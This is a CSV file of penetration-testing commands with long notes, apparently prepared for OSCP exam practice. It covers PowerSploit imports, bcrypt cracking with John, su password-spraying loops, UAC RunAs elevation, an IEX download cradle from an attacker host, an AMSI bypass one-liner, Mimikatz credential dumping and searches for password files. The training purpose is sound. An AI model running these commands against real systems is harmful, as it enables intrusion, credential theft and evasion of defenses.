"import-module-activedirectory","Import Active Directory Module","enumeration","Import-Module ActiveDirectory","Load Microsoft Active Directory PowerShell module to enable native AD cmdlets (Get-ADUser, Get-ADGroup, Get-ADComputer, etc.). Part of Remote Server Administration Tools (RSAT). Required for native AD enumeration without PowerView.","","OSCP Note:
RSAT is less common than PowerView on target systems but provides native Microsoft cmdlets.

On Windows Server:
Install-WindowsFeature RSAT-AD-PowerShell.

On Windows 10:
Install via Settings > Apps > Optional Features > RSAT:
Active Directory Domain Services.

Alternative if unavailable:
Use PowerView (Import-Module PowerView.ps1) or native tools (net user, net group, nltest).","high"
"import-powerup","Import PowerUp Module","enumeration","Import-Module <PATH>\PowerUp.ps1","Load PowerUp privilege escalation framework into PowerShell session. PowerUp is a PowerShell tool for Windows local privilege escalation checks including service misconfigurations, unquoted paths, AlwaysInstallElevated, DLL hijacking, and more.","","OSCP Essential:
PowerUp automates Windows privilege escalation checks.

Key functions:
Invoke-AllChecks (run all checks), Get-ServiceUnquoted (unquoted service paths), Get-ModifiableServiceFile (writable service binaries), Get-ModifiableRegistryAutoRun (hijackable autoruns).

PowerUp.ps1 may trigger AV - consider obfuscation.

Alternative:
Use WinPEAS (compiled binary) or manual checks.

Part of PowerSploit framework.","high"
"import-powersploit","Import PowerSploit Module","exploitation","Import-Module <PATH>\PowerSploit.psd1","Load PowerSploit offensive PowerShell framework. PowerSploit includes multiple modules: Privesc (PowerUp), Recon (PowerView), Exfiltration, Persistence, ScriptModification, and CodeExecution. Comprehensive post-exploitation toolkit for Windows.","","OSCP Context:
PowerSploit provides comprehensive toolkit but individual modules (PowerView, PowerUp) are more commonly used separately.

Loading full framework increases detection risk.

For OSCP, prefer targeted module imports:
PowerView for AD recon, PowerUp for privesc.

PowerSploit includes Get-GPPPassword (Privesc module).

May trigger AV/EDR - consider loading modules individually or using obfuscation.","high"
"get-process","Get Running Processes","enumeration","Get-Process","Enumerate all running processes on local or remote system. Native PowerShell cmdlet that returns process objects with detailed information including process name, ID, CPU usage, memory, and executable path.","","OSCP Usage:
Quick process enumeration to identify targets and avoid AV.

Look for AV processes (MsMpEng.exe, AVP.exe, etc.) before running exploits.

Get-Process doesn't show process owner by default - use Get-CimInstance Win32_Process for owner information.

For full process command line:
Get-CimInstance Win32_Process | Select-Object Name,CommandLine.

Faster than Get-CimInstance for basic enumeration.","medium"
"get-service","Get Windows Services","enumeration","Get-Service","Enumerate Windows services on local or remote system. Native PowerShell cmdlet that returns service objects with name, display name, and status. Critical for identifying vulnerable services and privilege escalation vectors.","","OSCP PrivEsc:
Get-Service shows basic service info.

For privilege escalation, need binary path and service account - use Get-CimInstance Win32_Service or sc qc <service>.

Key properties for privesc:
PathName (unquoted paths, writable binaries), StartName (services running as SYSTEM).

Check service permissions:
sc sdshow <service> or accesschk -ucqv <service>.

Faster than WMI for basic service status checks.","high"
"get-hotfix","Get Installed Hotfixes","enumeration","Get-HotFix","Enumerate installed Windows updates and security patches. Native PowerShell cmdlet that queries installed hotfixes, useful for identifying missing patches and potential kernel exploits.","","OSCP Kernel Exploits:
Compare installed patches against known exploits.

Key missing patches to check:
MS16-032, MS15-051, MS10-059.

For comprehensive patch analysis, combine with systeminfo output and use Windows-Exploit-Suggester.

Get-HotFix may not show all patches - wmic qfe is more comprehensive.

Check specific patch:
Get-HotFix -Id KB4012215.

Manual alternative:
wmic qfe get Caption,Description,HotFixID,InstalledOn","medium"
"john-crack-bcrypt","John Crack Bcrypt Hashes","post-exploit","john --format=bcrypt --wordlist=<WORDLIST> <HASH_FILE>","Crack bcrypt password hashes extracted from web applications (Laravel, Django, etc.) using John the Ripper","password-cracking","CRITICAL OSCP WEB EXPLOITATION: Bcrypt hashes commonly found in web app databases.

Bcrypt hash format:
$2y$10$abcdefghijklmnopqrstuv0123456789ABCDEFGHIJK
│  │ │ │                     │
│  │ │ └─ 22-char salt      └─ 31-char hash (base64)
│  │ └─ Cost factor (2^10 = 1024 rounds)
│  └─ Minor version (a, b, y)
└─ Bcrypt identifier

Cost factor impact (exponential):
Cost  Rounds    Speed
04    16        ~10,000/sec
10    1,024     ~100/sec
12    4,096     ~25/sec
14    16,384    ~6/sec

OSCP workflow for web app exploitation:
1. SQL injection → Dump users table
   sqlmap -r request.txt -p param --dump -D database -T users

2. Extract bcrypt hashes
   Look for $2y$, $2a$, $2b$ in password column
   Save to file: echo '$2y$10$...' > hashes.txt

3. Crack with John (THIS COMMAND)
   john --format=bcrypt --wordlist=rockyou.txt hashes.txt

4. Test credentials
   a. Web admin panel login
   b. SSH: ssh user@target
   c. su: su - user

5. Document in breakthrough.md

Bcrypt vs other hash types:
(1) MD5/SHA1 - FAST (millions/sec) → Easy to crack
(2) bcrypt - SLOW (hundreds/sec) → Hard to crack, better security
(3) NTLM - FAST (billions/sec with GPU) → Very weak
(4) SHA-512 (Linux shadow) - MEDIUM (thousands/sec)

Time estimates (rockyou.txt, cost $10):
- John (CPU): 40-50 hours for full rockyou.txt
- Hashcat (GPU): 4-5 hours for full rockyou.txt
- Common passwords: 5-30 minutes

Optimization strategies:
(1) Use smaller targeted wordlist first
    Common passwords: /usr/share/wordlists/fasttrack.txt
    Top 10k: head -10000 rockyou.txt > top10k.txt

(2) Use rules for mutations
    john --format=bcrypt --wordlist=top10k.txt --rules=best64 hashes.txt

(3) Switch to hashcat with GPU
    hashcat -m 3200 -a 0 hashes.txt rockyou.txt -O

(4) Check pot file periodically
    john --show --format=bcrypt hashes.txt

Common bcrypt sources in OSCP:
- Laravel: users table, password column ($2y$10$...)
- WordPress: wp_users table, user_pass column ($P$... = phpass, not bcrypt)
- Django: auth_user table, password column (bcrypt$...)
- Flask: users table, password_hash column

Extracting hashes from SQLMap output:
# SQLMap CSV format
grep '$2y$' ~/.local/share/sqlmap/output/*/dump/*/users.csv | cut -d',' -f3 > hashes.txt

# Or from manual SQL injection
UNION SELECT username,password FROM users WHERE password LIKE '$2y$%'

Checking already cracked:
john --show --format=bcrypt hashes.txt
Output: username:cracked_password:...

Manual verification:
# Verify hash format
echo 'test_password' | htpasswd -nBC 10 test | cut -d':' -f2
# Should produce $2y$10$... format

# Test cracked password immediately
ssh admin@target  # Try cracked password
su - admin        # From existing shell

OSCP exam tip: Start bcrypt cracking EARLY (background process). Use small wordlist first (top 10k rockyou). If no success in 15 minutes, move on and let it run in background (tmux/screen). Check back periodically. Document in failed_attempts.md if unsuccessful.

Time estimate:
- Setup: 1-2 minutes
- Cracking: 5 minutes - 50 hours (depends on password complexity and cost)
- Common passwords: 5-30 minutes success rate ~30%
","high"
"file-identify-type","Identify File Type","post-exploit","file <FILE>","Identify file type by examining file headers and magic bytes, bypassing file extension to determine actual content type","file-utilities","CRITICAL OSCP SKILL: Files without extensions or with wrong extensions are common in CTFs.

Common OSCP scenarios:
(1) Executable without .exe extension
    file suspicious_file → ELF 64-bit LSB executable
    → chmod +x suspicious_file && ./suspicious_file

(2) Image file with wrong extension
    file backup.txt → PNG image data
    → mv backup.txt backup.png && open backup.png

(3) Compressed archive disguised
    file data → gzip compressed data
    → mv data data.gz && gunzip data.gz

(4) Script with no extension
    file script → Python script, ASCII text
    → python3 script

(5) Database file
    file db → SQLite 3.x database
    → sqlite3 db

File type identification workflow:
1. List files: ls -la
2. Identify type (THIS COMMAND): file *
3. Rename if needed: mv file.txt file.png
4. Process accordingly:
   - Executables: chmod +x, run with ./ or analyze
   - Archives: extract with tar/unzip/gunzip
   - Images: view or check for steganography
   - Text: cat/less to read
   - Databases: sqlite3/strings to examine

Magic bytes (file signatures):
ELF:    7F 45 4C 46                 (Linux executable)
PE:     4D 5A                       (Windows .exe)
PNG:    89 50 4E 47                 (PNG image)
JPEG:   FF D8 FF                    (JPEG image)
PDF:    25 50 44 46                 (%PDF)
ZIP:    50 4B 03 04                 (ZIP archive)
GZIP:   1F 8B                       (gzip compressed)
TAR:    75 73 74 61 72              (tar archive)
SQLite: 53 51 4C 69 74 65           (SQLite database)

File command output interpretation:
ELF 64-bit LSB executable, x86-64, dynamically linked
│   │      │              │         └─ Linking type
│   │      │              └─ Architecture
│   │      └─ Byte order (LSB=little-endian)
│   └─ Bit width
└─ File format (Executable and Linkable Format)

Manual verification:
# Check magic bytes directly
xxd <FILE> | head -1
# First 16 bytes show file signature

# Multiple files
file * | grep -v directory

# Recursive
find . -type f -exec file {} \; | grep -v directory

Advanced analysis:
# Check for hidden data (steganography)
binwalk <FILE>
strings <FILE>
exiftool <FILE>

# Check encoding
file -i <FILE>  # Shows MIME type and charset

# Check architecture compatibility
file binary | grep -o 'x86-64\|ARM\|i386'

OSCP exam scenarios:
(1) Found file in web directory without extension
    → file identifies as ELF executable
    → Download, chmod +x, run for privesc

(2) Backup file with .txt extension
    → file reveals gzip compressed
    → Extract with gunzip for credentials

(3) Image upload bypass verification
    → Upload PHP shell as image.jpg
    → file image.jpg shows: PHP script, ASCII text
    → Proves upload filter only checks extension

(4) Binary analysis for reversing
    → file binary shows architecture and linking
    → Helps choose correct decompiler/debugger

Quick reference:
file <FILE>           - Basic type identification
file -b <FILE>        - Brief output (no filename)
file -i <FILE>        - MIME type and encoding
file -z <FILE>        - Look inside compressed files
file -L <FILE>        - Follow symlinks

OSCP exam tip: ALWAYS run 'file' on unknown files before attempting to use them. Saves time trying to execute images or decompress executables. Common pattern: find . -type f -exec file {} \; | grep -i 'executable\|archive\|image'.

Time estimate: <5 seconds per file","high"
"su-user-switch","Switch User with su","post-exploit","su - <USER>","Switch to another user account with password for lateral movement or privilege escalation to root","privilege-escalation","CRITICAL OSCP LATERAL MOVEMENT: Password reuse across user accounts is common.

su command variations:
su              - Switch to root (requires root password)
su -            - Switch to root with login environment
su <USER>       - Switch to <USER> (keeps current environment)
su - <USER>     - Switch to <USER> with login environment (RECOMMENDED)

Login environment (-) vs current environment:
WITH hyphen (su - user):
- HOME=/home/user
- PATH=/usr/local/bin:/usr/bin:/bin
- SHELL=/bin/bash
- PWD=/home/user
- All user's login scripts run (.bashrc, .profile)

WITHOUT hyphen (su user):
- HOME=/root (old value)
- PATH=/usr/sbin:/usr/bin (old value)
- SHELL=/bin/bash (old value)
- PWD=/root (old value)
- May cause permission errors, missing commands

OSCP workflow for password reuse:
1. Gain initial foothold (web shell, RCE)
2. Enumerate users: cat /etc/passwd | grep /bin/bash
3. Extract credentials:
   a. SQLi dump: sqlmap --dump -T users
   b. Config files: grep -r 'password' /var/www/
   c. Crack hashes: john --format=bcrypt hashes.txt
4. Test credentials with su (THIS COMMAND)
5. Escalate to root if user has sudo

Common OSCP scenarios:
(1) Web admin password works for SSH user
    su - admin
    Password: WebAdminPass123
    → Lateral movement successful

(2) Database credentials work for user account
    su - dbuser
    Password: db_password_123
    → Access to user with sudo rights

(3) Cracked hash enables root access
    su -
    Password: cracked_from_shadow
    → Root shell obtained

(4) Password found in config file
    cat /var/www/config.php → password: 'SecretPass123'
    su - www-data
    Password: SecretPass123

Password testing strategy:
# Test single password against all users
for user in $(cut -d: -f1 /etc/passwd | grep -v 'nologin\|false\|sync'); do
  echo ""Testing $user""
  echo 'password123' | su - $user -c 'whoami' 2>/dev/null && echo ""SUCCESS: $user""
done

# Test multiple passwords for specific user
while IFS= read -r pass; do
  echo ""Testing: $pass""
  echo ""$pass"" | su - admin -c 'whoami' 2>/dev/null && echo ""SUCCESS: $pass"" && break
done < passwords.txt

su vs sudo:
su - <USER>:
- Requires target user's password
- Full login shell as target user
- No audit trail
- Used for: Lateral movement, root access

sudo -u <USER> <COMMAND>:
- Requires YOUR password (current user)
- Runs single command as target user
- Logged in /var/log/auth.log
- Used for: Temporary privilege escalation

sudo su - <USER>:
- Requires YOUR password
- Switches to target user via sudo
- Useful when you know YOUR password but not target's

Verification after su:
whoami           - Confirm current user
id               - Show UID, GID, groups
echo $HOME       - Verify home directory changed
echo $USER       - Verify USER variable
pwd              - Current working directory
sudo -l          - Check new user's sudo rights

OSCP privilege escalation with su:
1. Find user with sudo rights:
   grep -E '^[^#]*sudo' /etc/group
   → Lists users in sudo group

2. Switch to that user:
   su - sudo_user
   Password: found_password

3. Escalate to root:
   sudo su -
   → Root shell

Advanced flags:
-c <COMMAND>  - Run single command as user
-s <SHELL>    - Use specific shell instead of user's default
-l            - Simulate full login (same as hyphen)
-m            - Preserve environment (opposite of hyphen)

OSCP exam tip: ALWAYS test found credentials with su immediately. Test against all enumerated users (password reuse). Document all working credentials in credentials.txt. If su succeeds, check sudo -l for privilege escalation path.

Time estimate: 30 seconds (successful) + 2-5 minutes (testing multiple users/passwords)","high"
"powershell-runas-basic","PowerShell - Manual UAC Elevation (Basic)","post-exploit","powershell -Command ""Start-Process powershell -Verb RunAs""","Launch new PowerShell window as administrator with UAC prompt (requires GUI interaction)","windows","EDUCATIONAL CONTEXT:
This technique requires MANUAL INTERACTION - user must click 'Yes' on UAC prompt. NOT suitable for:
- OSCP exam (no GUI interaction on reverse shells)
- Automated exploitation scripts
- Remote command execution via WinRM/SSH
- Situations where stealth is required (UAC prompt is visible)

WHY THIS EXISTS:
Legitimate administrative workflow for interactive sessions (RDP, physical console). When admin user needs elevated privileges but launched PowerShell as standard user.

UAC PROMPT BEHAVIOR:
1. User in Admins group + UAC enabled = Consent prompt ('Yes/No')
2. Standard user + UAC enabled = Credential prompt (username/password required)
3. UAC disabled = Process spawns elevated without prompt

WHEN TO USE:
- RDP session as admin user, need elevated PowerShell
- Physical console access, testing admin workflows
- Social engineering scenarios (convince user to click 'Yes')
- Legitimate sysadmin tasks in controlled environment

WHEN NOT TO USE (OSCP):
- Reverse shell from web exploit (no GUI)
- WinRM remote command execution (non-interactive)
- SSH shell access (no Windows desktop)
- Any scenario requiring stealth (UAC prompt visible to user/defender)

ALTERNATIVES FOR OSCP:
- UAC bypass (fodhelper, eventvwr) - No prompt, works in reverse shells
- Exploit service misconfigurations - No user interaction
- Token impersonation (JuicyPotato) - If SeImpersonate privilege available
- Credential reuse with runas /savecred - If admin cached credentials

HOW UAC WORKS:
1. Process requests elevation via '-Verb RunAs'
2. Windows displays consent.exe (UAC prompt on Secure Desktop)
3. User clicks Yes → Process spawns with High integrity token
4. User clicks No → Process never spawns, error returned
5. Consent dialog times out (default 150 seconds) → Denied

BEHIND THE SCENES:
- Consent.exe runs on Secure Desktop (separate desktop session, prevents screen scraping)
- Event ID 4688 logged (process creation with elevated token)
- Parent process ID changes (new elevated process not child of current shell)
- Token type changes: Filtered Admin Token → Full Admin Token

INTEGRITY LEVELS:
Before RunAs: Medium Mandatory Level (filtered admin token)
After RunAs (Yes clicked): High Mandatory Level (full admin token)

TIME ESTIMATE:
10-15 seconds (including user clicking prompt)

EXAM TIP:
DO NOT attempt this on OSCP exam. You cannot interact with UAC prompts on target machines. Use:
1. UAC bypass if user in Admins group
2. Service exploitation if no admin access
3. Kernel exploits as last resort

MANUAL ALTERNATIVE:
Right-click PowerShell icon → 'Run as Administrator' (same UAC prompt)

VERIFICATION:
Before: whoami /groups | findstr 'Mandatory'
  → Mandatory Label\Medium Mandatory Level
After: whoami /groups | findstr 'Mandatory'
  → Mandatory Label\High Mandatory Level","low"
"powershell-runas-output-redirect","PowerShell - UAC Elevation with Output Redirect","post-exploit","powershell -Command ""Start-Process powershell -Verb RunAs -ArgumentList '-Command','Get-Process > C:\temp\output.txt'""","Execute elevated PowerShell command with output redirected to file (requires UAC prompt approval)","windows","EDUCATIONAL CONTEXT:
This pattern attempts to work around the limitation that you can't directly capture output from elevated processes in a non-elevated shell.

WHY OUTPUT REDIRECT NEEDED:
Elevated process spawns in new window with new console. Output from elevated commands not visible in your current shell. File redirection bridges this gap.

WORKFLOW:
1. Current shell (Medium integrity) runs Start-Process
2. UAC prompt appears, user clicks 'Yes'
3. New PowerShell window spawns (High integrity)
4. Command executes in elevated context
5. Output written to file (accessible from both integrity levels)
6. Elevated window closes automatically
7. Original shell reads output file

COMMON USE CASE:
You have RDP access as admin user but PowerShell opened without elevation. Need to run Get-Service but capture output without opening new window and copy-pasting.

OSCP REALITY CHECK:
This technique is USELESS for exam because:
- No GUI on reverse shells
- Can't click UAC prompts remotely
- Automated exploitation required
- File I/O slower than direct output

BETTER ALTERNATIVES FOR OSCP:
1. UAC Bypass (no prompt):
   fodhelper-uac-bypass with reverse shell payload
2. Service Exploitation:
   If you can modify service, run commands as SYSTEM
3. Scheduled Tasks:
   Create task running as SYSTEM, wait for execution
4. Token Impersonation:
   JuicyPotato/PrintSpoofer if SeImpersonate available

FILE LOCATION CONSIDERATIONS:
Writable even from Medium integrity:
- C:\temp (if exists)
- C:\Users\<username>\AppData\Local\Temp
- C:\Users\Public

Require elevation even for admin users:
- C:\Windows\System32 (SYSTEM only)
- C:\Program Files (most locations)
- Registry hives (HKLM requires elevation)

WHY THIS PATTERN EXISTS:
Legitimate sysadmin workflow: Need one-off elevated command output without keeping elevated window open. Quick privilege check without persistent elevated shell.

READING OUTPUT:
Immediate read (may fail if process still running):
  type C:\temp\output.txt

Wait for completion:
  Start-Process ... -Wait -ArgumentList ...
  type C:\temp\output.txt

PowerShell monitoring:
  while (!(Test-Path C:\temp\output.txt)) { Start-Sleep 1 }
  Get-Content C:\temp\output.txt

PROCESS MONITORING:
With -PassThru flag:
  $proc = Start-Process ... -PassThru
  Wait-Process -Id $proc.Id
  Get-Content C:\temp\output.txt

SECURITY IMPLICATIONS:
- Output file readable by Medium integrity processes
- Sensitive data (password hashes) exposed in cleartext file
- File persists after execution (forensic artifact)
- Always clean up: Remove-Item C:\temp\output.txt -Force

COMMAND ESCAPING:
Nested quotes require careful escaping:
  Wrong: -ArgumentList '-Command','Get-Process | Where {$_.CPU -gt 10}'
  Right: -ArgumentList '-Command',""Get-Process | Where {`$_.CPU -gt 10}""

Backtick (`) escapes special characters in double quotes.

TIME ESTIMATE:
15-20 seconds (UAC prompt + file I/O + reading output)

EXAM TIP:
If you find yourself trying to use this on OSCP exam, STOP. You're approaching the problem wrong. Reverse shells can't interact with UAC. Use exploitation or bypass techniques instead.

MANUAL ALTERNATIVE:
1. Right-click PowerShell → Run as Administrator
2. Run command manually
3. Copy output from console
(Same UAC prompt, more steps)","low"
"powershell-runas-keepopen","PowerShell - UAC Elevation (Keep Window Open)","post-exploit","powershell -Command ""Start-Process powershell -Verb RunAs -ArgumentList '-NoExit','-Command','cd C:\\'""","Launch elevated PowerShell window that stays open for interactive use (requires UAC prompt)","windows","EDUCATIONAL CONTEXT:
Most common legitimate use of Start-Process -Verb RunAs. Opens persistent elevated PowerShell for interactive administrative work.

WHY -NoExit NEEDED:
Default PowerShell behavior: Execute command, then close window immediately. -NoExit keeps window open for continued interactive use.

ARGUMENT ORDER MATTERS:
  Correct:   -ArgumentList '-NoExit','-Command','cd C:\\'
  Incorrect: -ArgumentList '-Command','cd C:\\','-NoExit'  # -NoExit ignored if not first

COMPARISON OF PATTERNS:
1. Basic elevation (powershell-runas-basic):
   - No arguments
   - Opens elevated shell in default directory (System32)
   - Stays open by default (no -Command to execute)

2. Output redirect (powershell-runas-output-redirect):
   - Executes one command
   - Window closes immediately
   - Output captured to file

3. Keep open (THIS COMMAND):
   - Executes initial setup command
   - Stays open for interactive use
   - Can run multiple commands after opening

USE CASES:
- Run multiple elevated commands without reopening window each time
- Interactive troubleshooting requiring admin rights
- Testing scripts that require elevation
- Setting up environment (import modules, set variables) then work interactively

WHY NOT OSCP:
Same limitations as other manual elevation techniques:
- Requires GUI interaction (UAC prompt)
- User must be present to click 'Yes'
- Not automatable
- Reverse shells have no GUI
- Stealth not possible (visible window and UAC prompt)

WHEN YOU MIGHT USE THIS (NON-OSCP):
- RDP to Windows server, need admin PowerShell for configuration tasks
- Physical access to workstation, troubleshooting as admin
- Pentesting internal network with RDP access and known admin credentials
- Social engineering: convince user to run and approve UAC

INITIAL COMMAND IDEAS:
Set working directory:
  -ArgumentList '-NoExit','-Command','cd C:\\temp'

Load script/module:
  -ArgumentList '-NoExit','-Command','Import-Module ActiveDirectory'

Set execution policy for session:
  -ArgumentList '-NoExit','-ExecutionPolicy','Bypass'

Combine multiple setup commands:
  -ArgumentList '-NoExit','-Command','cd C:\\temp; Import-Module .\\MyModule.psm1'

WORKING DIRECTORY BEHAVIOR:
Elevated process starts in: C:\Windows\system32
Reason: Default working directory for processes launched with RunAs
Change with: -ArgumentList '-NoExit','-Command','cd <path>'

OR set before launching:
  Start-Process ... -WorkingDirectory 'C:\temp'
  (Note: -WorkingDirectory works WITH -Verb RunAs)

WINDOW STYLING:
Default: Normal window
  -WindowStyle Normal (default)
  -WindowStyle Maximized (full screen)
  -WindowStyle Minimized (starts in taskbar)
  -WindowStyle Hidden (invisible - not useful for interactive shell)

CLOSING THE WINDOW:
Manual: Type 'exit' or click X
Programmatic: Get-Process -Name powershell | Where {$_.MainWindowTitle -like '*Administrator*'} | Stop-Process

COMPARISON TO cmd.exe:
PowerShell:
  Start-Process powershell -Verb RunAs -ArgumentList '-NoExit'
Command Prompt:
  Start-Process cmd -Verb RunAs -ArgumentList '/k','cd C:\\'
  (/k keeps cmd open, /c closes after command)

PROFILE LOADING:
By default, elevated PowerShell loads profile from:
  $PFILES\WindowsPowerShell\profile.ps1
  $HOME\Documents\WindowsPowerShell\profile.ps1

Skip for faster startup:
  -ArgumentList '-NoExit','-NoProfile','-Command','...'

EXECUTION POLICY:
Inherited from system policy, usually:
  - RemoteSigned (default on servers)
  - Restricted (default on workstations)

Bypass for session:
  -ArgumentList '-NoExit','-ExecutionPolicy','Bypass'

TIME ESTIMATE:
10 seconds (UAC prompt + window spawn)

EXAM TIP:
This is a LEGITIMATE SYSADMIN TECHNIQUE, not a penetration testing technique. On OSCP, if you need elevated PowerShell:
1. First try UAC bypass (fodhelper/eventvwr)
2. If that fails, look for service misconfigurations
3. Check for privilege escalation vectors (Potato exploits)
4. Only use RunAs if you have RDP AND admin credentials AND need interactive session

MANUAL ALTERNATIVE:
1. Click Start menu
2. Type 'PowerShell'
3. Right-click 'Windows PowerShell'
4. Click 'Run as Administrator'
5. Click 'Yes' on UAC prompt
(Same result, GUI-only method)","low"
"powershell-runas-download-execute","PowerShell - UAC Elevation with Remote Script Download","post-exploit","powershell -Command ""Start-Process powershell -Verb RunAs -ArgumentList '-NoExit','-Command','IEX(New-Object Net.WebClient).DownloadString(\""http://<LHOST>/PowerUp.ps1\"")\""'""","Download and execute PowerShell script with elevation (requires UAC prompt) - combines RunAs with IEX download cradle","windows","EDUCATIONAL CONTEXT:
This technique combines THREE operations:
1. Manual UAC elevation (Start-Process -Verb RunAs)
2. Remote script download (WebClient.DownloadString)
3. In-memory execution (IEX)

WHY THIS PATTERN EXISTS:
Scenario: You have RDP access as admin user. Need to run PowerUp/PowerView/Mimikatz with elevation, but script is on attacker machine. This downloads and runs in single step with elevated privileges.

REALITY CHECK - NOT FOR OSCP:
This technique is SEVERELY LIMITED for exam:
- Requires GUI to click UAC prompt (reverse shells can't do this)
- User must be physically present or RDP active
- UAC prompt is highly visible (not stealthy)
- Requires network connectivity back to attacker (may be blocked)
- Automated exploitation impossible

WHEN YOU MIGHT USE THIS (RARE):
Pentesting scenario: Internal network, RDP access with known admin credentials, need to run enumeration tools (PowerView for AD recon, PowerUp for local privesc checks) without transferring files to disk.

BETTER ALTERNATIVES FOR OSCP:
1. UAC Bypass + Download:
   fodhelper-uac-bypass → bypass UAC without prompt
   Then run: IEX(New-Object Net.WebClient).DownloadString('http://<LHOST>/PowerUp.ps1')
   Result: Elevated execution WITHOUT user interaction

2. Non-Elevated Download First:
   Download script without elevation: IEX(New-Object...) in current shell
   Many tools work without elevation (PowerView, SharpHound)
   Escalate later if needed

3. File Transfer + Local Execution:
   certutil -urlcache -f http://<LHOST>/PowerUp.ps1 C:\temp\PowerUp.ps1
   Then: fodhelper-uac-bypass with local script execution
   Pros: Script persists if download interrupted, can reuse

QUOTE ESCAPING BREAKDOWN:
COMMAND LAYER 1 (outer shell):
  powershell -Command ""...""

COMMAND LAYER 2 (Start-Process argument):
  Start-Process ... -ArgumentList '...','...'

COMMAND LAYER 3 (elevated PowerShell command):
  IEX(New-Object Net.WebClient).DownloadString(""URL"")

ESCAPING RULES:
  Layer 3 quotes must be escaped for Layer 2: \"" (backslash-quote)
  Result: ...DownloadString(\""http://...\"")...

FILELESS EXECUTION:
Advantages:
- No file written to disk (less forensic artifact)
- AV may not scan in-memory downloads (depends on AMSI)
- Script doesn't persist after PowerShell closes

Disadvantages:
- Must re-download if connection lost or window closes
- AMSI (Anti-Malware Scan Interface) scans script content anyway
- Network traffic visible (HTTP GET logged)

WEB SERVER SETUP:
On attacker machine (Kali):
  cd /path/to/scripts
  python3 -m http.server 80
  # Or: sudo python3 -m http.server 80 (if binding to port 80)

Verify script accessible:
  curl http://localhost/PowerUp.ps1
  (Should return script content)

From target:
  Test-NetConnection <LHOST> -Port 80
  Invoke-WebRequest http://<LHOST>/PowerUp.ps1

COMMON SCRIPTS TO USE:
1. PowerUp.ps1 - Windows privesc enumeration
   https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1
   After download: Invoke-AllChecks

2. PowerView.ps1 - Active Directory enumeration
   https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1
   After download: Get-NetUser, Get-NetGroup

3. Invoke-Mimikatz.ps1 - Credential dumping (requires elevation)
   After download: Invoke-Mimikatz -DumpCreds

AMSI BYPASS:
Windows 10+ has AMSI (Anti-Malware Scan Interface) that scans script content even when downloaded in-memory. Known malicious scripts (Mimikatz) may be blocked.

Bypass AMSI before download:
  [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

Combine with download:
  -ArgumentList '-NoExit','-Command','[Ref].Assembly...SetValue($null,$true); IEX(New-Object...)'

WINDOW BEHAVIOR:
-NoExit included: Window stays open after script executes
- For PowerUp: Review findings interactively
- For Mimikatz: Credentials displayed in window, can copy manually

Without -NoExit: Window closes immediately after script completes
- Output lost unless redirected to file
- Not useful for interactive tools

NETWORK VISIBILITY:
HTTP traffic is UNENCRYPTED:
- Script content visible to network monitoring (IDS/IPS)
- Defender/EDR may inspect HTTP traffic
- Consider HTTPS if target allows (requires certificate on attacker server)

HTTPS alternative:
  python3 -m http.server --bind <LHOST> 443 --certfile cert.pem --keyfile key.pem
  (Requires self-signed cert, target may reject untrusted cert)

ALTERNATIVE DOWNLOAD METHODS:
1. Invoke-WebRequest (PowerShell 3.0+):
   IEX(Invoke-WebRequest -Uri http://<LHOST>/script.ps1 -UseBasicParsing).Content

2. BitsTransfer (stealthier, uses Windows BITS):
   Import-Module BitsTransfer
   Start-BitsTransfer -Source http://<LHOST>/script.ps1 -Destination C:\temp\script.ps1

3. certutil (file-based, not in-memory):
   certutil -urlcache -f http://<LHOST>/script.ps1 C:\temp\script.ps1

TIMING:
15-30 seconds:
- UAC prompt + user interaction: 5-10 sec
- Script download (depends on size): 1-5 sec
- Script execution (depends on script): 5-15 sec

FOR POWERUP:
- Download: ~2 sec (100KB file)
- Invoke-AllChecks execution: 10-30 sec (depending on system)

EXAM TIP - DO NOT USE:
If you're considering this on OSCP exam, you're making it too complicated. You likely have one of these situations:

1. You have RDP with admin creds:
   - Just run PowerShell as admin normally (right-click → Run as Admin)
   - Or use UAC bypass (no prompt needed)

2. You have reverse shell:
   - No GUI = can't click UAC prompt
   - Use UAC bypass techniques instead
   - Or download script without elevation first

3. You need PowerUp/PowerView output:
   - Many checks work without elevation
   - Run without UAC first, escalate later if needed

MANUAL ALTERNATIVE:
1. Open PowerShell as administrator (right-click → Run as Admin)
2. Click 'Yes' on UAC prompt
3. Run: IEX(New-Object Net.WebClient).DownloadString('http://<LHOST>/PowerUp.ps1')
4. Review output

(Same result, simpler execution, fewer quote-escaping errors)","low"
"windows-search-sensitive-files","Search for Sensitive Files and Credentials","post-exploit","dir /s /b C:\*password* C:\*cred* C:\*vnc* C:\*.config","Recursively search C: drive for files containing 'password', 'cred', 'vnc', or '.config' in filename. Discovers configuration files, credential stores, and backup files containing sensitive information.","credential-hunting","FIRST STEP after gaining Windows shell - hunt for low-hanging credential fruit. OSCP COMMON FINDS: (1) C:\Users\<user>\passwords.txt (plain text password lists), (2) C:\inetpub\wwwroot\web.config (database connection strings), (3) C:\Program Files\FileZilla Server\FileZilla Server.xml (FTP credentials), (4) C:\Users\<user>\AppData\Roaming\FileZilla\recentservers.xml, (5) VNC password files, (6) Unattend.xml (Windows deployment credentials). Time estimate: 30 seconds - 5 minutes (depends on drive size and result count).

MANUAL ALTERNATIVES:

Basic credential file search:
dir /s /b C:\*password* C:\*cred* C:\*vnc* C:\*.config

Expanded search terms:
dir /s /b C:\*pass* C:\*pwd* C:\*key* C:\*secret* C:\*backup* C:\*config*

Search user profiles only (faster):
dir /s /b C:\Users\*password* C:\Users\*cred*

Search web application directories:
dir /s /b C:\inetpub\wwwroot\*.config C:\inetpub\wwwroot\*.xml
type C:\inetpub\wwwroot\web.config | findstr /i password

Search for database connection strings:
dir /s /b C:\*.config | xargs type | findstr /i ""connectionString""

PowerShell recursive search (filename):
Get-ChildItem -Path C:\ -Recurse -Include *password*,*cred*,*vnc*,*.config -ErrorAction SilentlyContinue | Select-Object FullName

PowerShell content search (searches INSIDE files):
Get-ChildItem -Path C:\Users\ -Recurse -Include *.txt,*.xml,*.config -ErrorAction SilentlyContinue | Select-String -Pattern ""password|credential"" -SimpleMatch

HIGH-VALUE TARGET LOCATIONS:

1. User profiles:
C:\Users\<user>\Desktop\passwords.txt
C:\Users\<user>\Documents\credentials.xlsx
C:\Users\<user>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt (command history)

2. Web application config:
C:\inetpub\wwwroot\web.config (IIS web apps)
